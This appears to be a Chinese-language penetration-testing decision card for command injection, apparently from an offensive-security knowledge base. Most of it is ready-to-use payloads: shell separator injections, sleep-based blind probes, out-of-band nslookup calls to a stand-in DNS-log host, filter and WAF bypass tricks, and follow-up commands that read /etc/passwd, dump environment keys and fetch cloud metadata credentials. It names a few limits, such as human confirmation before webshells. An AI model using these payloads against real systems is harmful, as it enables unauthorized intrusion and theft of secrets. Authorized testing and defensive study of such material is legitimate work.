# 命令注入决策卡 (Light Deep Card)

> **CWE**: 78 / 77 | **ROI**: 极高 (P0)
> **轻便原则**: 只放命令注入高 ROI 路由: 信号判断 / 分隔符路由 / 盲注 OOB。具体 payload 变体不堆。

---

## 0. First-pass Signal

| 信号 | 判断 | 下一步 |
|------|------|--------|
| 参数值出现在系统命令中 (ping/traceroute/nslookup/转换/处理功能) | 命令注入入口 | §1 |
| `; whoami` → 回显 `www-data` | 确认 RCE | §4 影响证明 |
| `\| sleep 5` → 延迟 5s | 盲命令注入 | §2 OOB |
| 输入被过滤/报错 WAF | 需绕过 | §3 |
| 参数值出现在文件名/路径拼接 | 可能命令注入或路径遍历 | 先判路径遍历,再判命令注入 |

记录三要素: `HTTP_CODE`, `RESP_LENGTH_DELTA`, `TIMING_DELAY`。

**禁止**: First-pass 不用 `rm` / `wget` / `curl` 等有副作用的命令。

---

## 1. 分隔符路由

### 1.1 First-pass 分隔符 (按成功概率排序)

| 分隔符 | 场景 | 示例 |
|--------|------|------|
| `;` | 通用 Unix | `; id` |
| `\|` | 管道 | `\| id` |
| `&&` | 串联 (前成功才执行) | `&& id` |
| `\|\|` | 串联 (前失败才执行) | `\|\| id` |
| `$(...)` | 命令替换 | `$(id)` |
| `` `...` `` | 命令替换 | `` `id` `` |
| `\n` | 换行 | `%0a id` |
| `&` | Windows 后台 | `& dir` |

### 1.2 判断流程

```
1. 先用无害探测:  ; echo CVE2024TEST
2. 响应中出现 CVE2024TEST → 回显型, 直接证明 RCE
3. 响应无变化 → 盲型, 切换 sleep/OOB
4. 报错/被拦截 → §3 绕过
```

---

## 2. 盲命令注入

### 2.1 Time-based

```http
param=; sleep 5
param=| sleep 5
param=%0a sleep 5
```

对比基准响应时间;延迟 ≥ 4s 判定命中。

### 2.2 OOB (更可靠)

```
param=; nslookup <随机>.your-dnslog.cn
param=$(nslookup <随机>.your-dnslog.cn)
```

用 OOB 通道接收 DNS 查询。详见 [../oob-infrastructure.md](../oob-infrastructure.md)。

---

## 3. 绕过路由

| 过滤 | 绕过方法 |
|------|----------|
| 空格 | `${IFS}` / `cat<etc/passwd` / `{cat,etc/passwd}` |
| 黑名单关键词 | `wh'o'a'mi` / `wh\oami` / `w$()hoami` |
| `/` 被过滤 | `cd .. && cd .. && cat etc/passwd` |
| 命令被过滤 | `curl` → `wget` / `fetch` / `python -c` / `perl -e` |
| 编码绕过 | 双重 URL 编码 / `$'\154\163'` (8进制) |
| 长度限制 | 写入 `/tmp` 再执行 / 用 `>` 拼接文件 |

---

## 4. 影响证明

| 级别 | 动作 | 示例 |
|------|------|------|
| P0 确认 | 读系统标识 | `id` / `whoami` / `hostname` |
| P0 扩展 | 读敏感文件 | `cat /etc/passwd` (前3行) / `env` (找密钥) |
| P0 高影响 | 读应用配置 | `cat app/config.yml` / `env \| grep -i key` |
| P1 云场景 | 读云元数据 | `curl 169.254.169.254/latest/meta-data/` |

**禁止**: 写文件/WebShell/反弹 Shell 前 HITL 确认。

---

## 5. Triage

| 现象 | 可能原因 | 下一步 |
|------|----------|--------|
| sleep 无延迟 | 命令未执行 / 分隔符不对 | 换分隔符;试 `$(sleep 5)` |
| 回显截断/乱码 | 命令输出被部分处理 | 用 OOB;或 `base64` 编码输出 |
| WAF 拦截所有分隔符 | 严格过滤 | 试换行 `%0a`;试反引号;试命令替换嵌套 |
| 只在 Windows 环境 | `&` / `\|` 更可能成功 | `& dir` / `& whoami` |
| 命令在沙箱内 | 受限环境 | `ls /` 看挂载;`env` 看限制 |

---

## 6. 级联

- RCE → 读环境变量找 AK/密钥 → [../sensitive-info-exploitation.md](../sensitive-info-exploitation.md)
- RCE → 读云元数据 → [../cloud-security.md](../cloud-security.md) §1
- RCE → SSRF (curl 内网) → [ssrf.md](ssrf.md)
- 命令注入 + SSRF → 双重证明 → [../chained-logic-extended.md](../chained-logic-extended.md)

---

## 7. 相关参考

- SSTI 可能被误判为命令注入 → [ssti.md](ssti.md)
- 路径遍历类似入口 → [path-traversal.md](path-traversal.md)
- OOB 通道 → [../oob-infrastructure.md](../oob-infrastructure.md)
- WAF 绕过 → [../waf-bypass.md](../waf-bypass.md)
